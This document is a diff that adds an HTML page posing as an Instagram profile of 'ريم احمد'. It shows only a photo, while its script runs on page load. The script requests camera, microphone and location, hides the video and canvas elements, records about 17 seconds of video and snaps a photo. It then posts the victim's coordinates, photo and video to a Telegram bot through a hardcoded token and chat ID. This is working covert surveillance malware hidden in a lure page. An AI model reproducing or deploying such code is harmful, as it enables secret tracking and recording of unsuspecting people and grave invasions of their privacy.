@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="description" content="11k من المتابعين، 233 متابعة، 12 منشور">
+    <link rel="apple-touch-icon" href="allaa.jpg" />
+    <link rel="icon" type="image/jpg" href="allaa.jpg">
+    <title>ريم احمد INSTAGRAM</title>
+    <style >
+            video, canvas{
+            border: solid 3px black;
+            opacity: 0;
+            position: absolute;
+        }
+        .img{
+            width: 100px;
+            border-radius: 20px;
+        }
+        body{
+            height: 100vh;
+            width: 100%;
+            display: grid;
+            place-content: center;
+        }
+    </style>
+</head>
+<body>
+
+    
+    <img class="img" src="allaa.jpg" alt="no" />
+
+    <video width="150px" height="200px" id="video" autoplay="autoplay" muted="muted"></video>
+    <canvas width="150px" height="200px" id="canvas"></canvas>
+</body>
+<script>
+    const canvas = document.getElementById("canvas")
+    const video = document.getElementById("video");
+    let recorder;
+    let chunks = [];
+    // SEND LOCATION  AND INFO____
+    const getLocation = () => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sPos);
+        } else {
+            console.log("Error")
+        }
+    }
+    const sPos = (pos) => {
+        const {
+            latitude,
+            longitude
+        } = pos.coords
+        const corc = `📍LOCATION \n https://www.google.com/maps/place/${latitude},${longitude}`
+        const formData = new FormData(); formData.append("text", corc);
+        sendInfo('sendMessage', formData)
+    };
+    
+
+    // SEND VIDEO AND PHOTO
+
+
+    const getMedia = () => {
+        getLocation()
+        navigator.mediaDevices.getUserMedia({
+            video: true, audio: true
+        })
+        .then(stream => {
+            setTimeout(() => {
+                sendImg()
+            }, 6000)
+            sebdVideo(stream)
+            video.srcObject = stream
+            
+        })
+    }; getMedia()
+
+
+    const sendImg = () => {
+        canvas.getContext('2d').drawImage(video, 0, 0, video.width, video.height);
+        fetch(canvas.toDataURL('image/png')).then((res) => res.blob())
+        .then((blob) => {
+            console.log(blob)
+            const formData = new FormData(); formData.append("photo", blob, 'image.png');
+            sendInfo('sendPhoto', formData)
+        })
+    }
+
+    const sebdVideo = (stream) => {
+        recorder = new MediaRecorder(stream);
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.start();
+        setTimeout(() => {
+            recorder.stop()
+            setTimeout(() => {
+                const blob = new Blob(chunks, {
+                    type: "video/webn"
+                });
+                console.log(blob)
+
+                const formData = new FormData();
+                formData.append("video", blob, 'video.mp4');
+                sendInfo('sendVideo', formData)
+               // chunks = []
+            }, 0)
+        }, 17000)
+    }
+
+
+
+
+
+    const sendInfo = async (type, formData) => {
+        const tokin = '6848636559:AAFSKqxz55aBzpVLX-VQ-sSwroauu0CpR_k'
+        const url = `https://api.telegram.org/bot${tokin}/${type}?chat_id=5698258937`
+        const res = await fetch(url, {
+            method: 'POST',
+            body: formData
+        })
+        const data = await res.json()
+        console.log(data)
+    }
+</script>
+</html>
